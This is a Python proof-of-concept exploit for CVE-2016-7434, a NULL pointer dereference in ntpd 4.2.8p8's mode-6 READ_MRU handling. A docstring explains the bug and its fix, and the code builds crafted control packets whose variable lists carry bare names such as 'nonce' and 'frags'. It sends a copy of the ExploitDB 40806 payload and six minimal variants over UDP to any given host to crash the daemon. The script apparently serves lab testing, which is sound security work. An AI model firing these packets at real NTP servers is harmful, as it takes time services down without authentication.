#!/usr/bin/env python3
"""
CVE-2016-7434 - ntpd read_mru_list() NULL pointer dereference (DoS).

ntpd before 4.2.8p9 (here: 4.2.8p8) crashes when a MODE 6 control request with
opcode CTL_OP_READ_MRU (10) carries a variable in its data payload that has NO
'=value' part (a "bare name").  ntp_control.c:ctl_getitem() leaves *data == NULL
for a bare name, but read_mru_list() then feeds that NULL straight into
estrdup()/sscanf()/strcmp() (e.g. `nonce` -> estrdup(NULL), `frags` ->
sscanf(NULL, "%hu", ...)) -> NULL deref -> SIGSEGV.  Fixed in p9 by mapping a
NULL value to an empty string ("if (NULL == val) val = nulltxt;").

This is a pure mode-6 control request: NOAUTH, no `enable mode7`, no nonce
handshake required (the deref happens while still parsing the variable list,
before the nonce is ever validated).

Mirrors ExploitDB 40806 / opsxcq/exploit-CVE-2016-7434, and adds a couple of
minimal variants that each independently hit the NULL deref.
"""

import socket
import struct
import sys
import time

# NTP mode-6 control header.
#   byte0: LI(2) VN(3) MODE(3)  -> VN=2, MODE=6  => 0x16  (matches opsxcq/EDB)
#   byte1: R E M opcode(5)      -> opcode 10 = CTL_OP_READ_MRU => 0x0a
LI_VN_MODE = 0x16
OP_READ_MRU = 0x0a


def build_mode6(data: bytes, seq: int = 0x0010) -> bytes:
    """Build a mode-6 CTL_OP_READ_MRU packet wrapping `data` as the var list."""
    li_vn_mode = LI_VN_MODE
    op = OP_READ_MRU
    status = 0
    assoc = 0
    offset = 0
    count = len(data)
    hdr = struct.pack(">BBHHHHH", li_vn_mode, op, seq, status, assoc, offset, count)
    pkt = hdr + data
    # NTP control payloads are padded to a multiple of 4 bytes.
    while len(pkt) % 4:
        pkt += b"\x00"
    return pkt


# The verbatim opsxcq / EDB-40806 payload: starts with a bare "nonce" (no '='),
# which makes read_mru_list() do estrdup(NULL).
OPSXCQ_DATA = (
    b"nonce, laddr=[]:Hrags=32, laddr=[]:WOP\x00 2, laddr=[]:WOP\x00\x00"
)

# Minimal, surgical variants. Each leading token is a bare variable name with
# no '=', so ctl_getitem() returns the matching ctl_var while *data stays NULL.
VARIANTS = [
    ("opsxcq/EDB-40806 verbatim", OPSXCQ_DATA),
    ("bare nonce -> estrdup(NULL)", b"nonce"),
    ("bare frags -> sscanf(NULL)", b"frags"),
    ("bare limit -> sscanf(NULL)", b"limit"),
    ("bare maxlstint -> sscanf(NULL)", b"maxlstint"),
    ("bare laddr -> decodenetnum(NULL)", b"laddr"),
    ("nonce then frags, both bare", b"nonce,frags"),
]


def fire(host: str, port: int) -> None:
    print(f"[*] CVE-2016-7434 PoC -> {host}:{port}/udp (mode-6 READ_MRU)")
    for label, data in VARIANTS:
        pkt = build_mode6(data)
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(2.0)
        try:
            s.sendto(pkt, (host, port))
            print(f"[+] sent variant: {label!r} ({len(pkt)} bytes)")
            try:
                resp, _ = s.recvfrom(4096)
                print(f"    <- {len(resp)} byte reply (server still alive)")
            except socket.timeout:
                print("    <- no reply (timeout)")
        except OSError as exc:  # noqa: BLE001
            print(f"    !! send error: {exc}")
        finally:
            s.close()
        # Re-probe: if the server died, a follow-up bare-nonce gets no reply.
        time.sleep(0.4)
    print("[*] all variants sent; check `docker logs` for AddressSanitizer/SIGSEGV")


if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 123
    fire(host, port)
